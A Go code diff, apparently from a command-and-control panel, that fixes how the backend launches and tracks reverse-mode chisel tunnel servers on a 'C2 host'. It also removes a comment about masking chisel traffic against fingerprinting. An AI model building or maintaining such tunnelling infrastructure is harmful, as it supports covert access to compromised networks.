@@ -2189,6 +2189,11 @@ func handleGetProxies(c *gin.Context) {
 			} else {
 				proxyList[i].Status = "dead"
 			}
+		} else {
+			// Not in process map: server restarted or never tracked — treat as dead
+			if proxyList[i].Status == "running" {
+				proxyList[i].Status = "dead"
+			}
 		}
 	}
 	chiselProcsMu.Unlock()
@@ -2242,17 +2247,14 @@ func handleCreateProxy(c *gin.Context) {
 		serverPort = 50000 + (req.ListenPort % 10000)
 	}
 
-	// Anti-fingerprint: custom headers to mask chisel traffic
 	args := []string{
 		"server",
 		"--port", strconv.Itoa(serverPort),
 		"--auth", authKey,
 		"--reverse",
-		"--backend", wsPath,
 	}
 
 	cmd := exec.Command(chiselBin, args...)
-	// No SysProcAttr needed - chisel server runs on C2 host
 
 	if err := cmd.Start(); err != nil {
 		c.JSON(http.StatusInternalServerError, APIResponse{
@@ -2266,7 +2268,14 @@ func handleCreateProxy(c *gin.Context) {
 		pid = cmd.Process.Pid
 	}
 
-	// Monitor process in background
+	// Add to map BEFORE starting goroutine to avoid race condition:
+	// if the process exits immediately, the goroutine's delete() would be a no-op,
+	// then the main thread would add a dead cmd to the map forever.
+	chiselProcsMu.Lock()
+	chiselProcs[newID] = cmd
+	chiselProcsMu.Unlock()
+
+	// Monitor process exit in background
 	go func() {
 		cmd.Wait()
 		chiselProcsMu.Lock()
@@ -2275,10 +2284,6 @@ func handleCreateProxy(c *gin.Context) {
 		db.Model(&Proxy{}).Where("id = ?", newID).Update("status", "dead")
 		addLog("PROXY", fmt.Sprintf("CHISEL_SERVER_EXITED: %s (PID %d)", newID, pid))
 	}()
-
-	chiselProcsMu.Lock()
-	chiselProcs[newID] = cmd
-	chiselProcsMu.Unlock()
 
 	serverURL := fmt.Sprintf("http://C2_HOST:%d", serverPort)
 
